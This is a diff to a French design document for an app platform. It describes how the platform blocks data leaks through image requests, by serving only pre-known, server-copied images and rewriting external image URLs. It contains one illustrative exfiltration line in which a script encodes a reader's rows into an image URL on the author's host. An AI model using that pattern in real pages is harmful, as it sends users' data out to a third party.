@@ -396,6 +396,58 @@ par l'hôte, après l'accord du lecteur :
   requête (`?q=`) : un lecteur qui ne comprend pas une adresse ne l'ouvre pas.
 - **Pages de l'app** : inchangé — `<a href="#/route">` ou `oto.go("/route")`.
 
+#### Images : celles que la plateforme connaissait AVANT la lecture (`images_connues`)
+
+Une image est une requête : un cadre qui charge n'importe quelle image (`img-src
+https:`) laisse le script composer `<img src="https://hôte-de-l-auteur/?d=<lignes>">`
+pendant la lecture. **La règle : une app montre toute image dont l'adresse était connue
+avant d'être lue, et rien de ce qui est composé pendant.** Le cadre ne charge que notre
+stockage média ; l'image y est une COPIE.
+
+- **Connue** = écrite côté serveur, à un moment qui ne dépend d'aucun lecteur
+  (`oto_mcp/images_connues.py`) :
+  - dans le HTML ou le manifeste ENREGISTRÉ d'une app (création, mise à jour, patch,
+    restauration, publication, brouillon — `db/apps.apprendre_les_images`, au plus
+    `MAX_PAR_APP` par écriture) : là où le navigateur charge une image (`src`,
+    `srcset`, `poster`, `href` d'une `<image>` SVG, `url(…)` du CSS), telle quelle ;
+    ailleurs (chaîne de script, manifeste) seulement si elle a l'air d'une image —
+    jamais un `<a href>`, jamais un script ni une police ;
+  - dans une ligne de tableau, une valeur qui a l'air d'une image (nom de colonne,
+    extension, hôte d'un service d'images ; une cellule en couches par sa seule valeur ;
+    au plus `MAX_PAR_LIGNE`) écrite par une source qui APPREND : `agent`, `api`,
+    `upload`, `import`, et `system` seulement s'il rejoue un outil nommé
+    (`ecriture_apprend`) — jamais la file de travail, les formules, la maintenance.
+- **Jamais par la session d'un lecteur** : `console` n'apprend pas. L'écran hôte d'une
+  page écrit par elle hors de `me.app.call` — une page dans un document écrit par les
+  routes de tableau, l'annulation d'un geste d'app aussi ; une page n'agit que par la
+  session de son lecteur. Le prix : une adresse tapée à la main dans un tableau n'est
+  pas apprise. En plus, tout `me.app.call` tient `images_connues.geste_d_app`. Et une
+  valeur DÉJÀ dans la ligne n'est pas apprise par l'écriture suivante
+  (`urls_des_lignes` compare à la ligne d'avant) : une formule, ou un agent qui réécrit
+  la ligne autour d'une autre colonne, ne la rend pas connue.
+- **Le registre** (`images_connues`, empreinte SHA-256 de la chaîne EXACTE, sans
+  normalisation) est posé dans la transaction de l'écriture, sous un point de
+  sauvegarde : son échec est journalisé, l'écriture reste faite.
+- **La copie** : la boucle `images_connues` (`images_connues_worker.py`, `tiers=True`,
+  éteinte tant que l'instance ne pose pas `OTO_IMAGES_CONNUES_ENABLED=1`) télécharge chaque adresse UNE fois par
+  `tools/web._fetch_http` — la garde d'egress à chaque redirection, 3 Mo au plus, format
+  lu sur les octets (png, jpeg, gif, webp ; jamais SVG) — et la dépose publique sous
+  `app-images/<empreinte>` (`media_store.upload_image_connue`). Panne passagère
+  (réseau, délai, 5xx, 429) ou imprévue : trois essais espacés ; le reste est `refusee`, définitif.
+- ⚠️ **Rien n'est téléchargé à cause d'une lecture** — ni copie à la demande, ni
+  rafraîchissement : l'auteur enregistrerait mille adresses et la page choisirait, à la
+  lecture, lesquelles demander. Une adresse signée qui expire (photo LinkedIn) est copiée
+  tant qu'elle vit, et la copie lui survit.
+- **Le front** réécrit chaque adresse d'image externe de la page (`src`, `srcset`,
+  `url()` du CSS, celles que le script pose) vers `<stockage>/app-images/<sha256>`, qu'il
+  calcule lui-même : pas de route, pas de liste à demander. Non copiée = 404, image
+  absente, rien ne sort.
+- **Ce qui n'est pas fermé ici** : un agent lancé par l'app avec `input: true` reçoit
+  ce que la page compose (le lecteur l'a vu et accepté) et peut le recopier dans une
+  ligne ou le lire sur le web — ce chemin sort déjà sans image. Les lignes écrites avant
+  ce lot ne sont pas connues (aucune reprise). Le registre n'a ni org ni compte : une
+  copie de photo de profil n'est pas effacée avec l'org qui l'a apprise.
+
 ### Suivre les runs
 
 - `agent_runs` : les derniers runs d'un agent déclaré que l'auteur et le lecteur voient
